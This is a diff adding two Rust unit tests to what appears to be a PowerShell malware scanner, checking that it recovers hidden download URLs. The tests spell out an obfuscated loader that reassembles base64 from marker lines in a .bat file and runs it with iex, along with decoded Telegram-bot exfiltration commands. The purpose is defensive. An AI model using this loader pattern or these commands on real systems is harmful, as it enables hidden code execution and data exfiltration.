@@ -10719,6 +10719,100 @@ if ($finalScript -ne $null) {{
     }
 
     #[test]
+    fn ps1_file_backed_marker_base64_loader_recurses_into_download_trait() {
+        use crate::env::{Environment, FsEntry};
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-RestMethod -Uri 'https://api.telegram.org/bot987:ghi/sendMessage?chat_id=777'";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            decoded
+                .encode_utf16()
+                .flat_map(|unit| unit.to_le_bytes())
+                .collect::<Vec<u8>>(),
+        );
+        let mut noisy = String::with_capacity(b64.len() + 64);
+        for (idx, chunk) in b64.as_bytes().chunks(17).enumerate() {
+            noisy.push_str(std::str::from_utf8(chunk).expect("base64 is utf8"));
+            if idx % 2 == 0 {
+                noisy.push_str("waikikibondibeach");
+            } else {
+                noisy.push_str("npd");
+            }
+        }
+        let chunk_len = noisy.len().div_ceil(5);
+        let mut file_content = String::new();
+        for idx in 0..5 {
+            let start = idx * chunk_len;
+            let end = ((idx + 1) * chunk_len).min(noisy.len());
+            if start < end {
+                file_content.push_str(&format!(":::{}{}\r\n", idx + 1, &noisy[start..end]));
+            }
+        }
+
+        let mut env = Environment::default();
+        env.vars
+            .insert("userprofile".into(), r"c:\users\jsmith".into());
+        env.modified_filesystem.insert(
+            r"c:\users\jsmith\aoc.bat".into(),
+            FsEntry::Content {
+                content: file_content.into_bytes(),
+                append: false,
+            },
+        );
+
+        let loader = br#"$banana="$env:USERPROFILE\aoc.bat";if(Test-Path $banana){$rawLines=gc $banana|?{$_ -like ":::*"};$part1=($rawLines|?{$_ -like ":::1*"}|%{$_.Substring(4)});$part2=($rawLines|?{$_ -like ":::2*"}|%{$_.Substring(4)});$part3=($rawLines|?{$_ -like ":::3*"}|%{$_.Substring(4)});$part4=($rawLines|?{$_ -like ":::4*"}|%{$_.Substring(4)});$part5=($rawLines|?{$_ -like ":::5*"}|%{$_.Substring(4)});$kiwi=$part1+$part2+$part3+$part4+$part5;$apple=($kiwi-replace"waikikibondibeach",""-replace"npd","");if($apple){try{iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($apple)))}catch{}}}"#;
+        crate::ps1_scan::extract_self_embedded_ps1(&mut env, std::str::from_utf8(loader).unwrap());
+        crate::ps1_scan::scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src.contains("api.telegram.org/bot987:ghi/sendMessage?chat_id=777"))
+            }),
+            "file-backed marker base64 stage URL was not extracted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn ps1_file_backed_colon_space_base64_loader_recurses_into_download_trait() {
+        use crate::env::{Environment, FsEntry};
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri 'https://api.telegram.org/bot111:abc/sendMessage?chat_id=888'";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            decoded
+                .encode_utf16()
+                .flat_map(|unit| unit.to_le_bytes())
+                .collect::<Vec<u8>>(),
+        );
+
+        let mut env = Environment::default();
+        env.vars
+            .insert("userprofile".into(), r"c:\users\jsmith".into());
+        env.modified_filesystem.insert(
+            r"c:\users\jsmith\aoc.bat".into(),
+            FsEntry::Content {
+                content: format!(":: {b64}\r\n").into_bytes(),
+                append: false,
+            },
+        );
+
+        let loader = br#"$banana="$env:USERPROFILE\aoc.bat";if(Test-Path $banana){$rawLines=gc $banana|?{$_ -like ":: *"};$apple=($rawLines|%{$_.Substring(3)});if($apple){try{iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($apple)))}catch{}}}"#;
+        crate::ps1_scan::extract_self_embedded_ps1(&mut env, std::str::from_utf8(loader).unwrap());
+        crate::ps1_scan::scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src.contains("api.telegram.org/bot111:abc/sendMessage?chat_id=888"))
+            }),
+            "file-backed colon-space base64 stage URL was not extracted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn ps1_sorted_comment_chunks_are_extracted() {
         let script = concat!(
             ":: 030000000002eadable.example/a.ps1\r\n",
